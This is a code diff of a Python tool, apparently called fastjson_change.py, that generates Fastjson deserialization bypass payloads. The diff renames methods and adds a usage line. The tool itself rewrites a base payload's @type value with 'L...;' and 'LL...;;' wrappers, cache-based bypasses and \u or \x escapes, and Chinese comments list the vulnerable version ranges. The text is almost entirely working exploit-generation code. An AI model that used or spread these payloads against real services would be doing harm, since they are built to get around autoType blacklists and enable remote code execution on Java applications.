@@ -4,7 +4,7 @@
 import json,copy
 import sys
 
-from json import JSONDecodeError, load
+from json import JSONDecodeError
 
 
 class FastJson:
@@ -15,7 +15,7 @@ class FastJson:
             raise ex
         self.base_payload = base_payload
 
-    def gen_common(self, payload, op, func):
+    def common(self, payload, op, func):
         tmp_payload = json.loads(payload)
         dct_objs = [tmp_payload]
 
@@ -46,11 +46,11 @@ class FastJson:
         return json.dumps(json.loads(self.base_payload))
     # 对@type的value增加L开头，;结尾的payload
     def payload1(self, payload: str):
-        return self.gen_common(payload, 1, lambda v: "L" + v + ";")
+        return self.common(payload, 1, lambda v: "L" + v + ";")
 
     # 对@type的value增加LL开头，;;结尾的payload
     def payload2(self, payload: str):
-        return self.gen_common(payload, 2, lambda v: "LL" + v + ";;")
+        return self.common(payload, 2, lambda v: "LL" + v + ";;")
     
     # 生成cache绕过payload
     def payload3(self, payload: str):
@@ -82,15 +82,15 @@ class FastJson:
 
     # 对@type的value进行\u
     def payload5(self, payload: str):
-        return self.gen_common(payload, 4,
+        return self.common(payload, 4,
                                lambda v: ''.join('\\u{:04x}'.format(c) for c in v.encode())).replace("\\\\", "\\")
 
     # 对@type的value进行\x
     def payload6(self, payload: str):
-        return self.gen_common(payload, 5, 
+        return self.common(payload, 5, 
                                lambda v: ''.join('\\x{:02x}'.format(c) for c in v.encode())).replace("\\\\", "\\")
 
-    def gen(self):
+    def payload(self):
 
         base_funcs = [self.payload0, self.payload1, self.payload2, 
                     self.payload3, self.payload4]
@@ -114,14 +114,15 @@ if __name__ == '__main__':
                 "cache型  1.2.25 <= v <= 1.2.47(autotype close)",
                 "cache+L型  1.2.25 <= v <= 1.2.47(all)"]
 
-        fjp = FastJson(payload)
+        pp = FastJson(payload)
         i = 1
-        for payloads in fjp.gen() :
+        for payloads in pp.payload() :
             print(str(i) + ":" + lists[i - 1], end = "\n\n")
             for p in payloads:
                 print(p, end = "\n\n")
             i += 1
     except :
         print('''Usage: Open source code and replace basic payload.''')
+        print('''       python ./fastjson_change.py''')
         print()
         raise
